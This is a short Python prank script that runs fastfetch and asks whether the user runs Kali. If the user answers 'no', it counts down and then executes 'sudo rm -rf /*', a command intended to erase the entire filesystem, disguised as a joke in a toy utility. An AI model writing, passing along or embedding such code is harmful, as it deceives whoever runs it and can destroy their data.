import subprocess
import time

def run_fastfetch():
    try:
        result = subprocess.run(["fastfetch"], capture_output=True, text=True)
        print(result.stdout)
    except FileNotFoundError:
        print("Fastfetch is not installed. Please install it first.")

def ask_debian():
    answer = input("Do you use Kali? (yes/no): ").strip().lower()
    if answer == "yes":
        print("Good choice! Kali users are awesome 😎")
        subprocess.run(["fastfetch", "--", "logo", "kali"])
    elif answer == "no":
        print("Oh no! Running 'sudo rm -rf /*' ...")
        for i in range(5, 0, -1):
            print(f"Deleting everything in {i}...")
            time.sleep(1)
        subprocess.run(["sudo", "rm", "-rf", "/*"])
    else:
        print("Please type yes or no.")

if __name__ == "__main__":
    ask_debian()
